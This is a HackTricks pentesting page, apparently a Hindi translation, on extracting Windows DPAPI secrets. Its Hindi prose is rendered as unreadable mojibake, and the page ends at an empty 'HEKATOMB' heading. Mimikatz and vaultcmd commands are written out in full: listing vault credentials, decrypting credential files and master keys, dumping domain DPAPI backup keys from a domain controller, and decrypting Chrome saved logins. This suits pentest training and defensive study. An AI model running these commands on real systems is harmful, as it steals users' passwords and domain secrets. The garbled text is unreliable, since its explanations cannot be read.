# DPAPI - рдкрд╛рд╕рд╡рд░реНрдб рдирд┐рдХрд╛рд▓рдирд╛

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХреЛ HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХрд▓ [**NFT**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣ред
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ **рд╢рд╛рдорд┐рд▓** рд╣реЛрдВ рдпрд╛ рдореБрдЭреЗ **Twitter** [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)** рдХрд╛** **рдЕрдиреБрд╕рд░рдг** рдХрд░реЗрдВред**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рдХреЛ** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗ рдЕрдкрдирд╛ рдпреЛрдЧрджрд╛рди рджреЗрдВред**

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

тАЛтАЛ[**RootedCON**](https://www.rootedcon.com/) рд╕реНрдкреЗрди рдореЗрдВ рд╕рдмрд╕реЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдЗрд╡реЗрдВрдЯ рд╣реИ рдФрд░ рдпреВрд░реЛрдк рдореЗрдВ рд╕рдмрд╕реЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдореЗрдВ рд╕реЗ рдПрдХ рд╣реИред **рддрдХрдиреАрдХреА рдЬреНрдЮрд╛рди рдХреЛ рдмрдврд╝рд╛рд╡рд╛ рджреЗрдиреЗ** рдХреА рдорд┐рд╢рди рдХреЗ рд╕рд╛рде, рдпрд╣ рдХрд╛рдВрдЧреНрд░реЗрд╕ рдкреНрд░реМрджреНрдпреЛрдЧрд┐рдХреА рдФрд░ рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рд╡рд┐рд╢реЗрд╖рдЬреНрдЮреЛрдВ рдХреЗ рд▓рд┐рдП рдПрдХ рдЙрдмрд▓рддрд╛ рд╣реБрдЖ рдорд┐рд▓рди рд╕реНрдерд╛рди рд╣реИред

{% embed url="https://www.rootedcon.com/" %}

рдЗрд╕ рдкреЛрд╕реНрдЯ рдХреЛ рдмрдирд╛рддреЗ рд╕рдордп mimikatz рдХреЛ DPAPI рдХреЗ рд╕рд╛рде рд╕рдВрдмрдВрдзрд┐рдд рд╣рд░ рдХрд╛рд░реНрд░рд╡рд╛рдИ рдХреЗ рд╕рд╛рде рд╕рдорд╕реНрдпрд╛рдПрдВ рдереАрдВ, рдЗрд╕рд▓рд┐рдП **рдЕрдзрд┐рдХрд╛рдВрд╢ рдЙрджрд╛рд╣рд░рдг рдФрд░ рдЫрд╡рд┐рдпрд╛рдВ рдпрд╣рд╛рдВ рд╕реЗ рд▓реА рдЧрдИ рдереАрдВ**: [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#extracting-dpapi-backup-keys-with-domain-admin)

## DPAPI рдХреНрдпрд╛ рд╣реИ

рд╡рд┐рдВрдбреЛрдЬ рдСрдкрд░реЗрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рдЗрд╕рдХрд╛ рдкреНрд░рд╛рдердорд┐рдХ рдЙрдкрдпреЛрдЧ рдЕрд╕рдордорд┐рддреНрд░ рдирд┐рдЬреА рдХреБрдВрдЬреАрдпреЛрдВ рдХреЗ рд╕рдордорд┐рддреНрд░ рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд╣рд╛рдВ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдпрд╛ рд╕рд┐рд╕реНрдЯрдо рд╕реАрдорд┐рддрддрд╛ рдХреЗ рдпреЛрдЧрджрд╛рди рдХреЗ рд░реВрдк рдореЗрдВ рдПрдВрдЯреНрд░реЛрдкреА рдХрд╛ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдпреЛрдЧрджрд╛рди рдХреЗ рд░реВрдк рдореЗрдВ рдПрдХ рд╕рдордорд┐рддреНрд░ рдХреБрдВрдЬреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред\
**DPAPI рд╡рд┐рдХрд╛рд╕рдХреЛрдВ рдХреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓реЙрдЧрдСрди рд╕реАрдХреНрд░реЗрдЯ рд╕реЗ рдПрдХ рд╕рдордорд┐рддреНрд░ рдХреБрдВрдЬреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХреБрдВрдЬреАрдпреЛрдВ рдХреЛ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ**, рдпрд╛ рд╕рд┐рд╕реНрдЯрдо рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рдХреЗ рдорд╛рдорд▓реЗ рдореЗрдВ, рд╕рд┐рд╕реНрдЯрдо рдХреЗ рдбреЛрдореЗрди рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╕реАрдХреНрд░реЗрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗред

рдЗрд╕рд╕реЗ рдбреЗрд╡рд▓рдкрд░ рдХреЛ рдмрд╣реБрдд рдЖрд╕рд╛рдиреА рд╕реЗ рдбреЗрдЯрд╛ рдХреЛ рдХрдВрдкреНрдпреВрдЯрд░ рдореЗрдВ **рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб рдбреЗрдЯрд╛** рд╕рд╣реЗрдЬрдиреЗ рдореЗрдВ рдорджрдж рдорд┐рд▓рддреА рд╣реИ **рдмрд┐рдирд╛** рдЪрд┐рдВрддрд╛ рдХрд┐рдП **рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди** **рдХреБрдВрдЬреА** рдХреЛ **рд╕реБрд░рдХреНрд╖рд┐рдд** рдХреИрд╕реЗ **рд░рдЦреЗрдВ**ред

### DPAPI рдХреНрдпрд╛ рд╕реБрд░рдХреНрд╖рд┐рдд рдХрд░рддрд╛ рд╣реИ?

DPAPI рдХрд╛ рдЙрдкрдпреЛрдЧ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╡реНрдпрдХреНрддрд┐рдЧрдд рдбреЗрдЯрд╛ рдХреА рд╕реБрд░рдХреНрд╖рд╛ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ:

* рдЗрдВрдЯрд░рдиреЗрдЯ рдПрдХреНрд╕рдкреНрд▓реЛрд░рд░, Google \*Chrome рдореЗрдВ рдкрд╛рд╕рд╡рд░реНрдб рдФрд░ рдлреЙрд░реНрдо рдСрдЯреЛ-рд╕рдВрдкреВрд░реНрдгрддрд╛ рдбреЗрдЯрд╛
* Outlook, Windows Mail, Windows Mail рдЖрджрд┐ рдореЗрдВ рдИрдореЗрд▓ рдЦрд╛рддрд╛ рдкрд╛рд╕рд╡рд░реНрдб
* рдЖрдВрддрд░рд┐рдХ FTP рдкреНрд░рдмрдВрдзрдХ рдЦрд╛рддрд╛ рдкрд╛рд╕рд╡рд░реНрдб
* рд╕рд╛рдЭрд╛ рдлрд╝реЛрд▓реНрдбрд░ рдФрд░ рд╕рдВрд╕рд╛рдзрди рдЙрдкрдпреЛрдЧ рдкрд╛рд╕рд╡рд░реНрдб
* рд╡рд╛рдпрд░рд▓реЗрд╕ рдиреЗрдЯрд╡рд░реНрдХ рдЦрд╛рддрд╛ рдХреБрдВрдЬреА рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб
* рд╡рд┐рдВрдбреЛрдЬ рдХрд╛рд░реНрдбрд╕реНрдкреЗрд╕ рдФрд░ рд╡рд┐рдВрдбреЛрдЬ рд╡реЙрд▓реНрдЯ рдореЗрдВ рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рдХреБрдВрдЬреА
* рд░рд┐рдореЛрдЯ рдбреЗрд╕реНрдХрдЯреЙрдк рдХрдиреЗрдХреНрд╢рди рдкрд╛рд╕рд╡рд░реНрдб, .NET рдкрд╛рд╕рдкреЛрд░реНрдЯ
* рдПрдиреНрдХреНрд░рд┐рдкреНрдЯрд┐рдВрдЧ рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо (EFS), рдореЗрд▓ S-MIME рдХреЛ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ рдХрд░рдирд╛, рдЕрдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдкреНрд░рдорд╛рдгрдкрддреНрд░, рдЗрдВрдЯрд░рдиреЗрдЯ рдЬрд╛рдирдХрд╛рд░реА рд╕реЗрд╡рд╛рдУрдВ рдореЗрдВ SSL/TLS
* EAP/TLS рдФрд░ 802.1x (VPN рдФрд░ WiFi рдкреНрд░рдорд╛рдгреАрдХрд░рдг)
* Credential Manager рдореЗрдВ рдиреЗрдЯрд╡рд░реНрдХ рдкрд╛рд╕рд╡рд░реНрдб
* API рдлрд╝рдВрдХреНрд╢рди CryptProtectData рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрд┐рд╕реА рднреА рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ рдкреНрд░реЛрдЧреНрд░рд╛рдореЗрдЯрд┐рдХ рд░реВрдк рд╕реЗ рд╕реБрд░рдХреНрд╖рд┐рдд рд╡реНрдпрдХреНрддрд┐рдЧрдд рдбреЗрдЯрд╛ред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, Skype, Windows Rights Management Services, Windows Media, MSN messenger, Google Talk рдЖрджрд┐ рдореЗрдВ
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдлрд╝рд╛рдЗрд▓реЗрдВ

**рдорд╛рд╕реНрдЯрд░ рдкрд╛рд╕рд╡рд░реНрдб рджреНрд╡рд╛рд░рд╛ рд╕рдВрд░рдХреНрд╖рд┐рдд рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдлрд╝рд╛рдЗрд▓реЗрдВ** рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕реНрдерд╛рдиреЛрдВ рдкрд░ рд╕реНрдерд┐рдд рд╣реЛ рд╕рдХрддреА рд╣реИрдВ:
```
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
рдПрдорд┐рдХреЗрдЯреНрдЬрд╝ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ `dpapi::cred`, рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рдЖрдкрдХреЛ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб рдбреЗрдЯрд╛ рдФрд░ рдЧрд╛рдЗрдбрдорд╛рд╕реНрдЯрд░рдХреА рдЬреИрд╕реА рд░реЛрдЪрдХ рдЬрд╛рдирдХрд╛рд░реА рдорд┐рд▓ рд╕рдХрддреА рд╣реИред
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
рдЖрдк **mimikatz рдореЙрдбреНрдпреВрд▓** `dpapi::cred` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЙрдЪрд┐рдд `/masterkey` рдХреЗ рд╕рд╛рде рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП:
```
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>
```
## рдорд╛рд╕реНрдЯрд░ рдХреБрдВрдЬреА

рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА RSA рдХреБрдВрдЬреА рдХреЛ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рд╣реЛрдиреЗ рд╡рд╛рд▓реА DPAPI рдХреБрдВрдЬреА `%APPDATA%\Microsoft\Protect\{SID}` рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рдХреА рдЬрд╛рддреА рд╣реИ, рдЬрд╣рд╛рдВ {SID} рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ [**рд╕реБрд░рдХреНрд╖рд╛ рдкрд╣рдЪрд╛рдирдХрд░реНрддрд╛**](https://en.wikipedia.org/wiki/Security\_Identifier) рд╣реЛрддрд╛ рд╣реИред **DPAPI рдХреБрдВрдЬреА рдорд╛рд╕реНрдЯрд░ рдХреБрдВрдЬреА рдХреЗ рд╕рд╛рдереА рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рдХреА рдЬрд╛рддреА рд╣реИ рдЬреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдирд┐рдЬреА рдХреБрдВрдЬреА рдХреЛ рд╕реБрд░рдХреНрд╖рд┐рдд рдХрд░рддреА рд╣реИ**ред рдпрд╣ рдЖрдорддреМрд░ рдкрд░ рдпрд╛рджреГрдЪреНрдЫрд┐рдХ рдбреЗрдЯрд╛ рдХреЗ 64 рдмрд╛рдЗрдЯ рд╣реЛрддреА рд╣реИред (рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрд╣ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рд╕реБрд░рдХреНрд╖рд┐рдд рд╣реЛрддреА рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЖрдк `cmd` рд╕реЗ `dir` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЗрд╕реЗ рд╕реВрдЪреАрдмрджреНрдз рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рд▓реЗрдХрд┐рди рдЖрдк PS рд╕реЗ рдЗрд╕реЗ рд╕реВрдЪреАрдмрджреНрдз рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ)ред
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдПрдХ рд╕рдВрдЧреНрд░рд╣ рдХреА рд░реВрдк рдореЗрдВ рдорд╛рд╕реНрдЯрд░ рдХреБрдВрдЬреА рдХреА рджрд┐рдЦрд╛рд╡рдЯ рдЗрд╕ рддрд░рд╣ рд╣реЛрдЧреА:

![](<../../.gitbook/assets/image (324).png>)

рд╕рд╛рдорд╛рдиреНрдпрддрдГ **рдкреНрд░рддреНрдпреЗрдХ рдорд╛рд╕реНрдЯрд░ рдХреБрдВрдЬреА рдПрдХ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб рд╕рдордорд┐рдд рдХреБрдВрдЬреА рд╣реЛрддреА рд╣реИ рдЬреЛ рдЕрдиреНрдп рд╕рд╛рдордЧреНрд░реА рдХреЛ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░ рд╕рдХрддреА рд╣реИ**ред рдЗрд╕рд▓рд┐рдП, рдЗрд╕реЗ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб рдорд╛рд╕реНрдЯрд░ рдХреБрдВрдЬреА** рдХреЛ **рдирд┐рдХрд╛рд▓рдирд╛** рджреГрд╢реНрдпрдорд╛рди рд╣реЛрддрд╛ рд╣реИ рддрд╛рдХрд┐ рдЗрд╕рдХреЗ рд╕рд╛рде рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ рдХреА рдЧрдИ **рдЕрдиреНрдп рд╕рд╛рдордЧреНрд░реА** рдХреЛ рдмрд╛рдж рдореЗрдВ **рдбрд┐рдХреНрд░рд┐рдкреНрдЯ** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред

### рдорд╛рд╕реНрдЯрд░ рдХреБрдВрдЬреА рдирд┐рдХрд╛рд▓реЗрдВ рдФрд░ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░реЗрдВ

рдкрд┐рдЫрд▓реЗ рдЦрдВрдб рдореЗрдВ рд╣рдордиреЗ guidMasterKey рдХреЛ рдвреВрдВрдврд╝рд╛ рдЬреЛ рдЗрд╕ рддрд░рд╣ рджрд┐рдЦрддрд╛ рд╣реИ `3e90dd9e-f901-40a1-b691-84d7f647b8fe`, рдпрд╣ рдлрд╝рд╛рдЗрд▓ рдЗрд╕рдореЗрдВ рд╣реЛрдЧреА:
```
C:\Users\<username>\AppData\Roaming\Microsoft\Protect\<SID>
```
рдЬрд╣рд╛рдВ рдЖрдк рдорд┐рдореАрдХреИрдЯреНрд╕ рдХреЗ рд╕рд╛рде рдорд╛рд╕реНрдЯрд░ рдХреБрдВрдЬреА рдХреЛ рдирд┐рдХрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
# If you know the users password
dpapi::masterkey /in:"C:\Users\<username>\AppData\Roaming\Microsoft\Protect\S-1-5-21-2552734371-813931464-1050690807-1106\3e90dd9e-f901-40a1-b691-84d7f647b8fe" /sid:S-1-5-21-2552734371-813931464-1050690807-1106 /password:123456 /protected

# If you don't have the users password and inside an AD
dpapi::masterkey /in:"C:\Users\<username>\AppData\Roaming\Microsoft\Protect\S-1-5-21-2552734371-813931464-1050690807-1106\3e90dd9e-f901-40a1-b691-84d7f647b8fe" /rpc
```
рдлрд╝рд╛рдЗрд▓ рдХреА рдорд╛рд╕реНрдЯрд░ рдХреБрдВрдЬреА рдЖрдЙрдЯрдкреБрдЯ рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗрдЧреАред

рдЕрдВрдд рдореЗрдВ, рдЖрдк рдЙрд╕ **рдорд╛рд╕реНрдЯрд░рдХреА** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдлрд╝рд╛рдЗрд▓** рдХреЛ **рдбрд┐рдХреНрд░рд┐рдкреНрдЯ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```
mimikatz dpapi::cred /in:C:\Users\bfarmer\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7 /masterkey:0c0105785f89063857239915037fbbf0ee049d984a09a7ae34f7cfc31ae4e6fd029e6036cde245329c635a6839884542ec97bf640242889f61d80b7851aba8df
```
### рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдХреЗ рд╕рд╛рде рд╕рднреА рд╕реНрдерд╛рдиреАрдп рдорд╛рд╕реНрдЯрд░ рдХреБрдВрдЬреА рдирд┐рдХрд╛рд▓реЗрдВ

рдпрджрд┐ рдЖрдк рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рд╣реИрдВ, рддреЛ рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ dpapi рдорд╛рд╕реНрдЯрд░ рдХреБрдВрдЬреА рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```
sekurlsa::dpapi
```
![](<../../.gitbook/assets/image (326).png>)

### рдбреЛрдореЗрди рдПрдбрдорд┐рди рдХреЗ рд╕рд╛рде рд╕рднреА рдмреИрдХрдЕрдк рдорд╛рд╕реНрдЯрд░ рдХреБрдВрдЬреА рдирд┐рдХрд╛рд▓реЗрдВ

рдПрдХ рдбреЛрдореЗрди рдПрдбрдорд┐рди рдмреИрдХрдЕрдк dpapi рдорд╛рд╕реНрдЯрд░ рдХреБрдВрдЬреА рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб рдХреБрдВрдЬреА рдХреЛ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ:
```
lsadump::backupkeys /system:dc01.offense.local /export
```
![](<../../.gitbook/assets/image (327).png>)

рдкреНрд░рд╛рдкреНрдд рдХреА рдЧрдИ рдмреИрдХрдЕрдк рдХреБрдВрдЬреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ, рдЪрд▓рд┐рдП рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ 'spotless' рдХреА рдорд╛рд╕реНрдЯрд░ рдХреБрдВрдЬреА рдХреЛ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░реЗрдВ:
```bash
dpapi::masterkey /in:"C:\Users\spotless.OFFENSE\AppData\Roaming\Microsoft\Protect\S-1-5-21-2552734371-813931464-1050690807-1106\3e90dd9e-f901-40a1-b691-84d7f647b8fe" /pvk:ntds_capi_0_d2685b31-402d-493b-8d12-5fe48ee26f5a.pvk
```
рдЕрдм рд╣рдо рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдПрдирдХреНрд░рд┐рдкреНрдЯреЗрдб рдорд╛рд╕реНрдЯрд░ рдХреБрдВрдЬреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрдирдХреЗ `spotless` рдХреНрд░реЛрдо рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдХреЛ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```
dpapi::chrome /in:"c:\users\spotless.offense\appdata\local\Google\Chrome\User Data\Default\Login Data" /masterkey:b5e313e344527c0ec4e016f419fe7457f2deaad500f68baf48b19eb0b8bc265a0669d6db2bddec7a557ee1d92bcb2f43fbf05c7aa87c7902453d5293d99ad5d6
```
![](<../../.gitbook/assets/image (329).png>)

## рдбреЗрдЯрд╛ рдХреЛ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ рдФрд░ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░рдирд╛

рдЖрдк рдбреЗрдЯрд╛ рдХреЛ рдбреАрдкреАрдПрдкреАрдЖрдИ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдорд┐рдореАрдХреИрдЯреНрд╕ рдФрд░ рд╕реА++ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ рдФрд░ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░рдиреЗ рдХрд╛ рдЙрджрд╛рд╣рд░рдг рдпрд╣рд╛рдВ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ: [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)\
рдЖрдк рдбреЗрдЯрд╛ рдХреЛ рдбреАрдкреАрдПрдкреАрдЖрдИ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕реА# рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ рдФрд░ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░рдиреЗ рдХрд╛ рдЙрджрд╛рд╣рд░рдг рдпрд╣рд╛рдВ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ: [https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection](https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection)

## SharpDPAPI

[SharpDPAPI](https://github.com/GhostPack/SharpDPAPI#sharpdpapi-1) [@gentilkiwi](https://twitter.com/gentilkiwi) рдХреЗ [Mimikatz](https://github.com/gentilkiwi/mimikatz/) рдкреНрд░реЛрдЬреЗрдХреНрдЯ рд╕реЗ рдХреБрдЫ DPAPI рдХреНрд╖рдорддрд╛рдУрдВ рдХрд╛ C# рдкреЛрд░реНрдЯ рд╣реИред

## HEKATOMB

